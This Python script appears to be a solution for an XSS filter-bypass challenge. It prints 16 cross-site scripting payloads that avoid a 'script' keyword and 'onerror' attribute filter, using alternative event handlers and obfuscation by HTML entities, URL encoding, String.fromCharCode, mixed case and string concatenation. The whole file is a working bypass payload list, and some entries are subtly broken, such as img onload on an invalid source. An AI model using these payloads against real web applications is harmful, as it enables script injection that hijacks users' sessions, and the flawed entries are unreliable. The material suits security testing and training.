import html
import urllib.parse

print("=== XSS Filter Bypass Payloads ===")
print("Filters: 'script' keyword blocked, 'onerror' attribute blocked")
print("Requirement: Must contain uppercase 'XSS' and execute alert('XSS')\n")

# Payload 1: img tag with onload (simplest bypass)
payload1 = '<img src=x onload=alert("XSS")>'
print("[1] IMG with onload (direct):")
print(f"    {payload1}\n")

# Payload 2: body tag with onload
payload2 = '<body onload=alert("XSS")>'
print("[2] BODY with onload (direct):")
print(f"    {payload2}\n")

# Payload 3: svg tag with onload
payload3 = '<svg onload=alert("XSS")>'
print("[3] SVG with onload (direct):")
print(f"    {payload3}\n")

# Payload 4: iframe with onload
payload4 = '<iframe src=javascript:alert("XSS") onload=alert("XSS")>'
print("[4] IFRAME with onload (direct):")
print(f"    {payload4}\n")

# Payload 5: details with ontoggle
payload5 = '<details open ontoggle=alert("XSS")>'
print("[5] DETAILS with ontoggle (direct):")
print(f"    {payload5}\n")

# Payload 6: form with onsubmit (requires interaction)
payload6 = '<form onsubmit=alert("XSS")><button>XSS</button></form>'
print("[6] FORM with onsubmit (direct, needs click):")
print(f"    {payload6}\n")

# Payload 7: input with onfocus and autofocus
payload7 = '<input autofocus onfocus=alert("XSS")>'
print("[7] INPUT with onfocus (direct, auto-triggers):")
print(f"    {payload7}\n")

# Payload 8: marquee with onstart
payload8 = '<marquee onstart=alert("XSS")>XSS</marquee>'
print("[8] MARQUEE with onstart (direct):")
print(f"    {payload8}\n")

print("="*50)
print("=== OBFUSCATED VERSIONS ===\n")

# Payload 9: HTML entity encoding
payload9 = '<img src=x onload=alert(&quot;XSS&quot;)>'
print("[9] HTML entity encoded quotes:")
print(f"    {payload9}\n")

# Payload 10: URL encoding
payload10_raw = '<img src=x onload=alert("XSS")>'
payload10_encoded = urllib.parse.quote(payload10_raw)
print("[10] Full URL encoding (for use in URL parameters):")
print(f"    Encoded: {payload10_encoded}\n")

# Payload 11: Hex encoding for XSS string
payload11 = '<img src=x onload=alert(String.fromCharCode(88,83,83))>'
print("[11] String.fromCharCode encoding for 'XSS':")
print(f"    {payload11}\n")

# Payload 12: Mixed case to bypass filters
payload12 = '<ImG sRc=x OnLoAd=alert("XSS")>'
print("[12] Mixed case tag/attributes:")
print(f"    {payload12}\n")

# Payload 13: Backticks and template literals
payload13 = '<img src=x onload=alert(`XSS`)>'
print("[13] Template literals with backticks:")
print(f"    {payload13}\n")

# Payload 14: String concatenation
payload14 = '<img src=x onload=alert("X"+"S"+"S")>'
print("[14] String concatenation:")
print(f"    {payload14}\n")

# Payload 15: Double encoding (URL + HTML)
payload15_double = '<img src=x onload=alert(%26%23088%3B%26%23083%3B%26%23083%3B)>'
print("[15] Double encoded (URL+HTML entities for 'XSS'):")
print(f"    {payload15_double}\n")

# Payload 16: Unusual event handler - onanimationstart
payload16 = '<div style="animation: x" onanimationstart=alert("XSS")>XSS</div>'
print("[16] Animation event handler:")
print(f"    {payload16}\n")

print("="*50)
print("SUMMARY: 16 payloads generated")
print("- Direct payloads use alternative event handlers (onload, ontoggle, onfocus, etc.)")
print("- Obfuscated payloads use encoding, case variation, string manipulation")
print("- All payloads avoid 'script' keyword and 'onerror' attribute")
print("- All contain uppercase 'XSS' and execute alert('XSS')")
